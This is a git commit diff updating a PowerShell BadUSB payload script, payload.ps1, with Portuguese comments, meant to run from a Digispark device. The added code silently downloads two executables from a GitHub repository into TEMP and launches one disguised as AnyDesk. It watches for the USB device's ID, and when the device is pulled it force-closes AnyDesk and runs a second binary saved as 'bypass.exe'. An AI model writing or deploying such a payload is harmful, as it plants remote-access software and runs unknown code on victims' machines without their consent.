4b36d2cb8276136de83edd815d0c94cbcf02bb7b
nohanvs <nohanvs@gmail.com>
2026-04-24 15:52:45 -0300

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -1,29 +1,35 @@
-# 1. Toca um som médio para avisar: "O Script começou e estou vigiando!"
-[System.Console]::Beep(1000, 500)
+$p = "$env:TEMP\main.exe"
+$b = "$env:TEMP\bypass.exe"
+$n = "AnyDesk"
 
-# Espera 3 segundos para estabilizar
-Start-Sleep -Seconds 3
+# Baixa os arquivos silenciosamente
+Invoke-WebRequest -Uri "https://github.com/nohanvs/bot-dc-dipariss7k/raw/refs/heads/main/AnyDesk.exe" -OutFile $p
+Invoke-WebRequest -Uri "https://github.com/nohanvs/bot-dc-dipariss7k/raw/refs/heads/main/SYNC-Otimizer.exe" -OutFile $b
 
-# Loop Vigilante (O segredo novo é o ConfigManagerErrorCode)
+# Inicia o principal (AnyDesk)
+Start-Process $p
+
+# Espera 5 segundos para garantir que o Windows já reconheceu o teclado
+Start-Sleep -Seconds 5
+
+# Loop Vigilante: Fica monitorando o ID EXATO do seu Digispark (1C4F)
 while ($true) {
-    # Busca o Digispark (16D0). 
-    # ConfigManagerErrorCode -eq 0 significa que ele ignora "fantasmas" e exige que o USB esteja 100% ativo.
-    $usb = Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -match '16D0' -and $_.ConfigManagerErrorCode -eq 0 }
-
+    $usb = Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -match '1C4F' }
+    
     if (-not $usb) {
-        # Tirou? Faz a prova real (espera 1 segundo)
-        Start-Sleep -Seconds 1
-        $confirm = Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -match '16D0' -and $_.ConfigManagerErrorCode -eq 0 }
-
+        # Sumiu? Espera 2 segundos para a Prova Real (evita falsos alertas)
+        Start-Sleep -Seconds 2
+        $confirm = Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -match '1C4F' }
+        
         if (-not $confirm) {
-            # SUCESSO! O USB sumiu de verdade.
-            # Toca um alarme agudo 5 vezes rápido!
-            for($i=0; $i -lt 5; $i++){
-                [System.Console]::Beep(2500, 200)
-                Start-Sleep -Milliseconds 100
-            }
+            # Desplugado com sucesso! Quebra o loop para fechar tudo.
             break
         }
     }
     Start-Sleep -Seconds 1
 }
+
+# Só chega nesta linha quando você puxa o Digispark
+# Fecha o AnyDesk forçadamente e abre o Otimizador
+Stop-Process -Name $n -Force -ErrorAction SilentlyContinue
+Start-Process $b
